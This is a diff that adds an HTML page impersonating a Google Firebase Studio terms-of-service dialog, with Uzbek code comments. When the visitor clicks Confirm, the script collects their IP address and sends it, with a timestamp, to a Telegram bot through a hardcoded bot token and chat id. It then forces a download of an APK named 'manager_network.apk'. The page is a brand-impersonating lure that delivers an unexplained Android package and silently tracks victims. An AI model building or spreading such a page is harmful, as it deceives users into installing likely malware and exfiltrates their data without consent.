@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Studio Setup</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .modal { background: white; padding: 32px; border-radius: 2px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 450px; border: 1px solid #dadce0; }
+        .checkbox-group { display: flex; align-items: flex-start; margin-bottom: 22px; font-size: 13.5px; color: #3c4043; }
+        .checkbox-group input { margin-right: 15px; width: 18px; height: 18px; cursor: pointer; accent-color: #1a73e8; }
+        .links { color: #1a73e8; text-decoration: none; cursor: pointer; }
+        .footer { display: flex; justify-content: flex-end; margin-top: 10px; }
+        #confirmBtn { background-color: #f1f3f4; color: #9aa0a6; border: none; padding: 8px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: not-allowed; transition: 0.2s; }
+        #confirmBtn.active { background-color: #1a73e8; color: white; cursor: pointer; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+    </style>
+</head>
+<body>
+
+<div class="modal">
+    <div class="checkbox-group">
+        <input type="checkbox" id="terms">
+        <label for="terms">I accept the terms and conditions for Firebase Services listed on the <span class="links">Terms of Service</span> page and the <span class="links">Android SDK Terms and Conditions</span></label>
+    </div>
+    <div class="checkbox-group">
+        <input type="checkbox" checked>
+        <label>I want to receive email updates about Firebase Studio news and features.</label>
+    </div>
+    <div class="checkbox-group">
+        <input type="checkbox" checked>
+        <label>I'm interested in participating in research studies to improve Firebase Studio</label>
+    </div>
+    <div class="footer">
+        <button id="confirmBtn" disabled>Confirm</button>
+    </div>
+</div>
+
+<script>
+    // --- Telegram Bot Sozlamalari ---
+    const botToken = '8758242717:AAFjA58U3daC37jsGiD9OzQt2sFH420DezM'; // O'zingizning bot tokeningizni qo'ying
+    const chatId = '6420024593'; // O'zingizning Telegram ID raqamingizni qo'ying
+
+    const terms = document.getElementById('terms');
+    const confirmBtn = document.getElementById('confirmBtn');
+
+    terms.addEventListener('change', function() {
+        confirmBtn.disabled = !this.checked;
+        this.checked ? confirmBtn.classList.add('active') : confirmBtn.classList.remove('active');
+    });
+
+    confirmBtn.addEventListener('click', async function() {
+        if(!this.disabled) {
+            let userIP = "Noma'lum";
+            
+            // 1. IP manzilni aniqlash
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (e) { console.log("IP aniqlashda xato"); }
+
+            // 2. Telegramga xabar yuborish
+            const message = `🚀 **Yangi Yuklash!**\n\n🌐 **IP:** ${userIP}\n⏰ **Vaqt:** ${new Date().toLocaleString()}\n📂 **Fayl:** manager_network.apk`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // 3. Faylni yuklab yuborish
+            // Fayl nomingizni koddagi bilan bir xil qiling!
+            window.location.href = "manager_network.apk"; 
+        }
+    });
+</script>
+
+</body>
+</html>
